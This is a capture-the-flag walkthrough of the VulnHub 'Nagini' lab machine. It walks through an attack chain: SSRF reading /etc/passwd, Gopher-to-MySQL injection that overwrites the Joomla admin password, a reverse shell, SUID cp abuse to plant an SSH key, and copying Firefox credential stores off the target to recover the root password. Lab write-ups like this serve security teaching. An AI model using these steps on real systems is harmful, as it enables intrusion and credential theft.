# HarryPotter: Nagini (1.0.2) - Walkthrough

## Description

Nagini is the 2nd VM of the HarryPotter VM series. Across the series, there are 8 horcruxes hidden in total (2 in Aragog, 3 in Nagini, 3 in the final VM). The goal is to find and capture all horcruxes on this machine and ultimately defeat Voldemort.

- **Machine:** [HarryPotter: Nagini (1.0.2)](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
- **Author:** Mansoor R (@time4ster)
- **Difficulty:** Medium
- **Target:** `192.168.10.88`
- **Attacker:** `192.168.10.x` (lab network)
- **Goal:** Capture all 3 horcruxes

> Tested in an isolated lab. Attacker-side commands are transcribed from shell history; long outputs trimmed to relevant lines.

---

## 1. Reconnaissance

I started by checking if the host was up and running a service/version scan.

```bash
ping 192.168.10.88
nmap -sV -sC -v 192.168.10.88
```

Only two ports were open, identical to the first lab in the series:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Opening `http://192.168.10.88` in the browser showed a full-screen image covering the entire page, with no links or visible text - just like Aragog. With nothing obvious on the landing page, I moved straight to directory enumeration.

I ran enumeration using two different wordlists as planned:

```bash
gobuster dir -u http://192.168.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.10.88 -w /usr/share/wordlists/sqlmap.txt
```

The enumeration revealed two interesting paths: `/joomla/` and `/note.txt`.

```bash
curl http://192.168.10.88/note.txt
```

The note contained the following:

```text
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

---

## 2. HTTP/3 discovery and SSRF

Since the note pointed to `quic.nagini.hogwarts` over HTTPS/HTTP3, I added it to my hosts file.

```bash
echo "192.168.10.88   quic.nagini.hogwarts" | sudo tee -a /etc/hosts
```

I used [quiche](https://github.com/cloudflare/quiche) to interact with the HTTP/3 endpoint. Visiting it led to `/internalResourceTcher.php`. The page presented a simple form with an input field and a "Fetch" button.

Testing for SSRF, I submitted `localhost/note.txt` which returned the exact contents of the note we just read. I then tried a local file read via `file://`:

```
file:///etc/passwd
```

This successfully dumped `/etc/passwd` from the target, confirming SSRF with file read capabilities.

---

## 3. Joomla enumeration, DB leak and authentication bypass

I scanned the Joomla instance at `/joomla/` with `joomscan`:

```bash
joomscan -u http://192.168.10.88/joomla/
```

`joomscan` identified a backup file. I downloaded it and inspected its contents:

```bash
wget http://192.168.10.88/joomla/configuration.php.bak
cat configuration.php.bak
```

Inside, the database configuration revealed credentials:

```php
...
public $dbtype = 'mysqli';
...
public $user = 'goblin';
public $password = '';
...
```

The password was empty, but we had the DB user. With SSRF access to internal resources and knowledge of the stack, I used [Gopherus](https://github.com/tarunkant/Gopherus) to generate a Gopher payload to interact with the MySQL instance through the SSRF vector.

Using the generated payload via the SSRF endpoint, I was able to query the Joomla database. Looking through the tables, I found a user `site_admin` with an encrypted/hashed password. Attempts to crack it directly were unsuccessful.

Instead, I used the SSRF+Gopher attack to overwrite the admin password. The MD5 hash of `admin` is `21232f297a57a5a743894a0e4a801fc3` (`echo -n "admin" | md5sum`). I executed the following SQL update via the SSRF vector:

```sql
USE joomla; UPDATE joomla_users SET password='21232f297a57a5a743894a0e4a801fc3' WHERE email='site_admin@nagini.hogwarts';
```

With the password reset to `admin`, I logged into the Joomla admin panel at:

```
http://192.168.10.88/joomla/administrator/
```

Credentials used: `site_admin@nagini.hogwarts` / `admin`

---

## 4. Initial foothold - reverse shell as www-data

With admin access to Joomla, I leveraged a technique from [vk9-sec.com - Reverse Shell on Any CMS](https://vk9-sec.com/reverse-shell-on-any-cms/) to obtain a reverse shell. After deploying the shell through the CMS, I caught it and got access as `www-data`.

While exploring the web root, I found the first horcrux:

```bash
cat /var/www/html/horcrux1.txt
```

```
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
```

Decoded (base64):

```text
3: SlythEriN's LocKEet dEstroYeD bY RoN
```

**Horcrux 1 captured.**

---

## 5. Lateral movement to hermoine

Looking for the second horcrux, I saw it referenced at `/home/hermoine/horcrux2.txt`, but `www-data` did not have permission to read it. I needed to move laterally to another user first.

While enumerating `/home/`, I noticed user `snape`. In `/home/snape/` there was a cached credentials file `.creds.txt` which contained Snape's password. I used it to switch to the `snape` user.

From the `snape` account, I explored `/home/hermoine/`. There was a `bin/` directory containing an executable called `su_cp`. Inspection showed it was effectively a copy of `cp` but with the SUID bit set and owned by `hermoine`:

```bash
ls -la /home/hermoine/bin/su_cp
```

```
-rwsr-xr-x 1 hermoine hermoine 146880 Apr  4  2021 su_cp
```

There were also other cached directories like `.gnupg/` and `.mozilla/` that were not directly accessible in the current context. The `su_cp` binary could be used to copy files with `hermoine`'s privileges.

Knowing this, I generated an SSH keypair as `snape` and used `su_cp` to copy the public key into `hermoine`'s `~/.ssh/authorized_keys`. (This requires a bit of thinking about paths/permissions - the key was to copy `id_rsa.pub` into the correct location with the right ownership/permissions using the SUID copy.)

After placing the key, I connected to `hermoine` locally over SSH without a password:

```bash
ssh -i /home/snape/.ssh/id_rsa hermoine@localhost
```

Now as `hermoine`, I could read the second horcrux:

```bash
cat /home/hermoine/horcrux2.txt
```

```
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
```

Decoded (base64):

```text
4: Helga Hufflepuff's Cup destroyed by Hermione
```

*(Note: The `su_cp` SUID binary could also be used to directly copy `horcrux2.txt` to a readable location as another user.)*

**Horcrux 2 captured.**

---

## 6. Privilege escalation to root via Firefox credentials

For the third horcrux, I recalled from earlier enumeration that there was a `.mozilla` directory. As `hermoine`, I looked into it and found Firefox profile files including `key4.db`, `logins.json`, and `logins-backup.json`.

I exfiltrated these files to my attacker machine. I started a simple HTTP server on the target and downloaded them:

```bash
# On target (as hermoine/snape context as appropriate)
cd /home/hermoine/.mozilla/firefox/<profile>/
python3 -m http.server 1234
```

```bash
# On attacker
wget http://192.168.10.88:1234/key4.db
wget http://192.168.10.88:1234/logins.json
wget http://192.168.10.88:1234/logins-backup.json
```

I uploaded `key4.db` and `logins.json` to [Firefox Decryptor](https://keydecryptor.com/decryption-tools/firefox-decrypt) which decrypted the saved credentials and returned:

| URL | Username | Password |
|---|----------|----------|
| `http://nagini.hogwarts` | `root` | `@Alohomora#123` |

I switched to root using the recovered credentials:

```bash
su root
# Password: @Alohomora#123
```

In `/root/` I found the third horcrux and the completion banner:

```bash
cat /root/hocrux3.txt
```

```
      ____                            _         _       _   _                 
     / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
    | |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
    | |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
     \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                      |___/                                                   

    Machine Author: Mansoor R (@time4ster)
    Machine Difficulty: Medium
    Machine Name: Nagini
    Horcruxes Hidden in this VM: 3 horcruxes

    You have successfully pwned Nagini machine.
    Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}
```

Decoded (base64):

```text
5: Diadem of Ravenclaw destroyed by Harry
```

**Horcrux 3 captured.**

---

## 7. Summary of Findings

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 1 | HTTP/3 endpoint exposing `/internalResourceTcher.php` with SSRF | High | Allowed internal requests and local file reads (`file:///etc/passwd`, internal notes) |
| 2 | Joomla backup file (`configuration.php.bak`) exposed with DB config | High | Leaked DB details and aided further exploitation |
| 3 | Joomla admin password overwrite via SSRF + Gopher/MySQL injection | Critical | Full admin access to Joomla CMS |
| 4 | Authenticated Joomla admin leading to reverse shell (CMS exploitation) | Critical | Initial foothold as `www-data` |
| 5 | Cached credentials in `/home/snape/.creds.txt` | High | Lateral movement to `snape` |
| 6 | SUID copy binary `su_cp` owned by `hermoine` in `/home/hermoine/bin/` | Critical | Abuse to place SSH key / copy files as `hermoine` for lateral movement |
| 7 | Firefox saved credentials (`key4.db`, `logins.json`) recoverable | Critical | Password reuse led to root access |

### Attack Path

```
nmap (22,80) → gobuster with medium.txt + sqlmap.txt → /joomla/ + /note.txt
→ add quic.nagini.hogwarts to /etc/hosts → quiche to HTTP/3 → /internalResourceTcher.php (SSRF)
→ joomscan finds configuration.php.bak (DB creds goblin/:) → Gopherus payload via SSRF to MySQL
→ UPDATE joomla_users set password=md5(admin) for site_admin → login to /joomla/administrator/ 
→ reverse shell as www-data (vk9-sec method) → horcrux1 (/var/www/html/)
→ find snape creds in /home/snape/.creds.txt → switch to snape
→ use hermoine-owned SUID su_cp to copy SSH pubkey to /home/hermoine/.ssh/authorized_keys → ssh as hermoine (or copy horcrux directly)
→ horcrux2 (/home/hermoine/horcrux2.txt)
→ find Firefox creds in /home/hermoine/.mozilla/ (key4.db, logins.json) → exfiltrate & decrypt via keydecryptor.com/firefox-decrypt → root:@Alohomora#123
→ su root → horcrux3 (/root/hocrux3.txt)
```

---

## 8. Takeaways

This box chains multiple small issues together nicely: exposed enumeration paths, an HTTP/3 endpoint leaking to an SSRF that reaches internal services, a Joomla backup disclosure, DB manipulation through Gopher over SSRF, CMS exploitation for a web shell, cached credentials for lateral movement, a user-owned SUID binary for privilege escalation to another user, and finally stored browser credentials for root. The attack is methodical - each step enables the next, and none of the individual issues alone would complete the machine, but together they form a clean, complete path to all three horcruxes.
